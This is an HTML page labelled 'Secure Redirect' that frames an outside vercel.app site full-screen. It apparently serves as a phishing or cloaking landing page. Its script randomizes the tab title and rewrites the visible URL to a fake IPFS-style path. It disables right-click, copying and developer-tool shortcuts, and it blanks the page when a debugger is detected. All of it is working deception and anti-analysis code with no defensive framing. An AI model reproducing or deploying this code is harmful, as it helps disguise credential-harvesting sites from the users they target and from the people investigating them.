

<!DOCTYPE html>
<html>
<head>
    <title>Secure Redirect</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body, iframe {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
  <iframe
    id="myIframe"
    src="https://ecount-ttb.vercel.app/
"
    frameborder="0">
  </iframe>

<script>
  document.addEventListener("DOMContentLoaded", () => {

	// Randomize the page title
	const titles = [
	  "Dashboard", "Library", "Explorer", "Resource Hub", "Workspace",
	  "Control Panel", "Directory", "Navigation", "Project Center", "Board",
	  "Studio", "Data View", "Timeline", "Activity", "Overview",
	  "Discovery", "Cloud", "Insights", "Collections", "Stream"
	];

	document.title = titles[Math.floor(Math.random() * titles.length)];
    // Generate fake IPFS hash and push to history
	function generateRandomHash(minLength = 80, maxLength = 120) {
	  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~';
	  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
	  const array = new Uint8Array(length);
	  crypto.getRandomValues(array);

	  let result = '';
	  for (let i = 0; i < length; i++) {
		result += chars[array[i] % chars.length];
	  }
	  return result;
	}

	const randomHash = generateRandomHash();

    const currentDomain = window.location.hostname;
    const fakeIpfsUrl = `https://${currentDomain}/${randomHash}/${randomHash}`;

    window.history.pushState({ path: fakeIpfsUrl }, '', fakeIpfsUrl);

    const iframe = document.getElementById('myIframe');
    if (!iframe) {
      console.warn('Iframe not found');
      return;
    }

    // Apply styling and sandbox attributes
    iframe.style.width = '100vw';
    iframe.style.height = '100vh';
    iframe.style.border = 'none';
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-top-navigation allow-forms');

    // Protect inside iframe after it loads
    iframe.onload = () => {
      try {
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        ['contextmenu', 'keydown', 'copy', 'dragstart'].forEach(evt =>
          iframeDoc.addEventListener(evt, e => e.preventDefault())
        );
      } catch (err) {
        console.warn('Iframe protection could not be fully applied:', err);
      }
    };

    // Disable right-click on the main page
    document.addEventListener("contextmenu", e => e.preventDefault());

    // Disable key combinations that open dev tools
    document.addEventListener('keydown', function (e) {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toUpperCase() === "U") ||
        (e.metaKey && e.altKey && ["I", "J"].includes(e.key.toUpperCase()))
      ) {
        e.preventDefault();
        return false;
      }
    });

    // Trap debugger using infinite loop trick
    setInterval(function () {
      const start = performance.now();
      debugger;
      if (performance.now() - start > 100) {
        window.location.href = "about:blank";
      }
    }, 1000);

  });
</script>
</body>
</html>
